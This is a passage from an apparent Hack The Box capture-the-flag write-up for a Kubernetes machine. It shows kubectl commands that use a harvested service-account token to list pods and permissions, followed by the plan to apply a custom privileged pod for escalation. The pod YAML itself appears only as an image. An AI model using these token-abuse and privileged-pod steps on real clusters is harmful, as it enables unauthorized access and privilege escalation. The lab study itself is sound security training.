1pRrbLrfNk6DE5S9VSUCAwEAAaNhMF8wDgYDVR0PAQH/BAQDAgKkMB0GA1UdJQQW
MBQGCCsGAQUFBwMCBggrBgEFBQcDATAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQW
BBSpRKCEKbVtRsYEGRwyaVeonBdMCjANBgkqhkiG9w0BAQsFAAOCAQEA0jqg5pUm
lt1jIeLkYT1E6C5xykW0X8mOWzmok17rSMA2GYISqdbRcw72aocvdGJ2Z78X/HyO
DGSCkKaFqJ9+tvt1tRCZZS3hiI+sp4Tru5FttsGy1bV5sa+w/+2mJJzTjBElMJ/+
9mGEdIpuHqZ15HHYeZ83SQWcj0H0lZGpSriHbfxAIlgRvtYBfnciP6Wgcy+YuU/D
xpCJgRAw0IUgK74EdYNZAkrWuSOA0Ua8KiKuhklyZv38Jib3FvAo4JrBXlSjW/R0
JWSyodQkEF60Xh7yd2lRFhtyE8J+h1HeTz4FpDJ7MuvfXfoXxSDQOYNQu09iFiMz
kf2eZIBNMp0TFg==
-----END CERTIFICATE-----
```

> USING IT TO CHECK THE DEFAULT SERVICE ACCOUNT RIGHTS

```
┌──(brandy㉿bread-yolk)-[~]
└─$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.10.11.133:8443 get pods                                 
NAME    READY   STATUS    RESTARTS   AGE
nginx   1/1     Running   0          93m
```

```
┌──(brandy㉿bread-yolk)-[~]
└─$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.10.11.133:8443 auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
pods                                            []                                    []               [get create list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```


17. Based from the result, we know that we can create, get, and list pod in the default namespace.
18. Knowing this let's make a custom pod that has higher privilege.

> .yaml script


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/3c7918e0-213f-4b54-82ca-7c8d608c6450)



> APPLYING

```
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.10.11.133:8443 apply -f Downloads/machine/machine_steamcloud/brendi.yaml
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/20b9c656-ab88-48be-af06-1ebfa1bf84aa)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a82c0aad-ac41-41f4-a8f9-743a92a7bbee)


19. Wondered why it's not ready.
20. Let's restart the process from the start.



